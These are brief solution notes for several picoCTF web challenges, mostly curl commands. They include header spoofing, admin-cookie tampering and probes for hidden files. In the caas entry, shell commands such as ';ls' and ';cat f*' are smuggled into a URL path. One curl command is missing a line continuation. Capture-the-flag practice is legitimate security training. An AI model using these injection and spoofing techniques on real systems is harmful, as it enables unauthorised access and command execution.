## :robot: - where are the robots - `4`
```sh
$ curl http://jupiter.challenges.picoctf.org:36474/robots.txt
. . .
User-agent: *
Disallow: /_.html
. . .

$ curl http://jupiter.challenges.picoctf.org:36474/_.html
```

## :wood: - logon - `46`
- in chrome do `chrome://flags`
- set Partitioned cookies to enable
- relaunch and set admin cookie to true 

## :thread: - dont-use-client-side - `66`
```r
$ curl http://jupiter.challenges.picoctf.org:37821 | grep substring 
```

## :question: - who are you - `142`
```r
# HTTP Requests for Comments (RFC)

$ curl -H "user-agent: PicoBrowser" \
-H "referer: mercury.picoctf.net:34588" \
-H "date: 2018" 
-H "DNT: 1" \
-H "origin: sweden" \
-H "x-forwarded-for: 31.44.224.0" \
-H "accept-language: sv-swe" \
http://mercury.picoctf.net:34588
```

## 🉑 - Some Assembly Required 1 - `152`
###### hint: path in script

## 🇭🇺 - scavenger hunt - `161`
```r
#!/bin/bash

alias ggs='grep -i part | sed "s/^.*: //" | sed "s/ .*$//" '
url='http://mercury.picoctf.net:55079'

curl -s ${url} | ggs
curl -s ${url}/mycss.css | ggs
curl -s ${url}/robots.txt | ggs
curl -s ${url}/.htaccess | ggs
curl -s ${url}/.DS_Store | ggs
```
###### edited from
```sh
#!/bin/bash

curl -s -n http://mercury.picoctf.net:55079 | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/mycss.css | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/robots.txt | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/.htaccess | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/.DS_Store | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
```

## :baseball: - login - `200`
###### hint: base64

## :cow: - caas - `202`
```sh
$ curl "https://caas.mars.picoctf.net/cowsay/pwd;ls"
$ curl "https://caas.mars.picoctf.net/cowsay/xxx;cat f*"
```
